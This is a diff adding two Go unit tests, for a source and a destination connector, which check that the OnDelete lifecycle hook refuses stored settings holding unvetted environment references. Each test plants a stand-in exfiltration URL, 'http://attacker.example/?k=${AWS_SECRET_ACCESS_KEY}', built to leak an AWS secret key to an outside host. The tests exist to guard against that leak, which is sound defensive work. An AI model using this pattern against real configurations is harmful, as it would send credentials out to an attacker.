@@ -105,3 +105,51 @@ func TestDestination_Configure_DoesNotExpandEnv(t *testing.T) {
 	is.True(ok)
 	is.True(strings.HasPrefix(ce.Code.Reason(), "config.env_"))
 }
+
+// Lifecycle events must not hand a plugin settings that Configure would refuse:
+// OnDelete used to send the raw stored text, references and paths nobody had
+// vetted. With the default (fail-closed) resolver a ${VAR} reference is refused,
+// so the delete hook must not reach the plugin carrying it.
+func TestSource_OnDelete_DoesNotCarryRawSettings(t *testing.T) {
+	is := is.New(t)
+	ctx := context.Background()
+	t.Setenv("AWS_SECRET_ACCESS_KEY", secretValue)
+
+	src, sourceMock := newTestSource(ctx, t, gomock.NewController(t))
+	src.Instance.LastActiveConfig.Settings = map[string]string{"url": "http://attacker.example/?k=${AWS_SECRET_ACCESS_KEY}"}
+
+	var events []map[string]string
+	sourceMock.EXPECT().LifecycleOnDeleted(gomock.Any(), gomock.Any()).
+		DoAndReturn(func(_ context.Context, req pconnector.SourceLifecycleOnDeletedRequest) (pconnector.SourceLifecycleOnDeletedResponse, error) {
+			events = append(events, req.Config)
+			return pconnector.SourceLifecycleOnDeletedResponse{}, nil
+		}).AnyTimes()
+	sourceMock.EXPECT().Teardown(gomock.Any(), gomock.Any()).Return(pconnector.SourceTeardownResponse{}, nil).AnyTimes()
+
+	err := src.OnDelete(ctx)
+
+	is.True(err != nil)
+	is.Equal(len(events), 0) // the plugin must not receive the unvetted settings
+}
+
+func TestDestination_OnDelete_DoesNotCarryRawSettings(t *testing.T) {
+	is := is.New(t)
+	ctx := context.Background()
+	t.Setenv("AWS_SECRET_ACCESS_KEY", secretValue)
+
+	dest, destMock := newTestDestination(ctx, t, gomock.NewController(t))
+	dest.Instance.LastActiveConfig.Settings = map[string]string{"url": "http://attacker.example/?k=${AWS_SECRET_ACCESS_KEY}"}
+
+	var events []map[string]string
+	destMock.EXPECT().LifecycleOnDeleted(gomock.Any(), gomock.Any()).
+		DoAndReturn(func(_ context.Context, req pconnector.DestinationLifecycleOnDeletedRequest) (pconnector.DestinationLifecycleOnDeletedResponse, error) {
+			events = append(events, req.Config)
+			return pconnector.DestinationLifecycleOnDeletedResponse{}, nil
+		}).AnyTimes()
+	destMock.EXPECT().Teardown(gomock.Any(), gomock.Any()).Return(pconnector.DestinationTeardownResponse{}, nil).AnyTimes()
+
+	err := dest.OnDelete(ctx)
+
+	is.True(err != nil)
+	is.Equal(len(events), 0)
+}
